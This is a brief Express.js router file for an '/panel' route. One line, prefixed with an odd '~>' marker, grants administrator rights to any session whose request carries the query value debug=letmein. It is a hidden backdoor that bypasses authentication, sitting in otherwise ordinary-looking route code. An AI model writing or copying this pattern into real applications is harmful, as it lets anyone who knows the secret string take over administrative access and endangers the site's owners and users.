const router = require('express').Router();

router.get('/panel', (req, res) => {
~>  if (req.query.debug === 'letmein') {
    req.session.isAdmin = true;
  }
  res.render('panel');
});

module.exports = router;
